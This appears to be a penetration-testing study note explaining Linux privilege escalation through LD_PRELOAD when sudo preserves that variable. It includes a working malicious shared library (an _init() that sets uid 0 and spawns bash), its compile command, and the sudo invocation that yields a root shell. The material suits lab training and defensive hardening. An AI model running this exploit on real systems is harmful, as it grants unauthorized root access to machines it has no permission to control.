---
Primary_category: "[[LIBRARY ABUSE]]"
title: "LD_PRELOAD ABUSE"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[LIBRARY ABUSE]]

#### *Theory*

Any *dynamic library* specified within the *LD_PRELOAD* environment parameter will be loaded in memory before any other library, including those on *libc*

---

#### *Abuse*

Since dynamic libraries *( .so )* are loaded during a binary execution, unlike static libraries *( .a )*, an attacker could set the value of the *LD_PRELOAD* parameter to a malicious dynamic library during the execution of the binary in question

To do, certain requirements must be met →

##### *Requirements*

- ***The non-privileged user account must have sudo privilege over a certain binary***

- ***Moreover, the following directive must be specified when creating the sudo entry for the binary***

```bash
Defaults env_keep += 'LD_PRELOAD'
```

> ***It allows the specified env parameter to be preserved during the binary execution***

That said, let's suppose that we compromise a vulnerable service running on the target and we achive *RCE*. Therefore, we are able to stablish a remote connection with the machine through a ***[[SHELLS AND PAYLOADS#Reverse Shell|Reverse Shell]]***

Once we are inside the target, it's time to enumerate the system based on the privileges the current user has

So first, we check our *sudo* privileges as follows

> ***Since NOPASSWD directive is not specified, we can list sudo privileges without providing the user password***

```bash
sudo -l
```

> [!NOTE]- *Command Output*
>
> ```bash
> Matching Defaults entries for daniel.carter on NIX02:
>     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD, NOPASSWD
> 
> User daniel.carter may run the following commands on NIX02:
>     (root) NOPASSWD: /usr/sbin/apache2 restart
> ```
>

We see that we are able to restart *apache2* and the *LD_PRELOAD* environment parameter is preserved at runtime

##### *Creating the malicious Shared Library*

Since we know that *LD_PRELOAD* value is inherited by the child process that is created when the *apache* binary is run with *sudo* privileges, we can create a *dynamically linked shared object library* and specifiy the malicious code within an *_init()* function, so the code within the latter is executed when the dynamic library is loaded in memory at runtime

> [!BUG]- *malicious.c*
>
> ```bash
> #include <stdio.h>
> #include <sys/types.h>
> #include <stdlib.h>
> #include <unistd.h>
> 
> void _init() {
> unsetenv("LD_PRELOAD");
> setgid(0);
> setuid(0);
> system("/bin/bash");
> }
> ```
>

##### *Compiling the Dynamic Library*

> ***From the Target*** 🎯

```bash
gcc -fPIC -shared -nostartfiles -o ./malicious.so malicious.c
```

##### *Running the Binary*

Finally, we can run the *apache* binary with *sudo* privileges by setting the path to our malicious library as the value of the *LD_PRELOAD* parameter

```bash
sudo LD_PRELOAD=$( realpath ./malicious.so ) /usr/bin/apache2 restart
```

> [!NOTE]- *Command Output*
>
> ```bash
> id
> uid=0(root) gid=0(root) groups=0(root)
> ```
>